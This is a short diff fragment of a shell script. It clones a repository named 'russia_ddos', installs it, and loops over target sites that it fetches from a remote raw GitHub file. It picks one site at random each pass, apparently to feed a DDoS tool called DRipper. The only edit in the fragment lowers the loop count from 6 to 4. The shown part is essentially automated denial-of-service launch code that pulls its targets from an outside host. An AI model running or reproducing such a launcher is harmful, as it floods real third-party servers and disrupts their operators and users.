@@ -11,7 +11,7 @@ git clone https://github.com/alexmon1989/russia_ddos.git
 cd russia_ddos
 pip install -r requirements.txt
 
-for i in $(seq 1 6)
+for i in $(seq 1 4)
 do
         site=$(curl https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper | cat | shuf -n 1)
         addr=$(echo $site | awk '{print $1}')
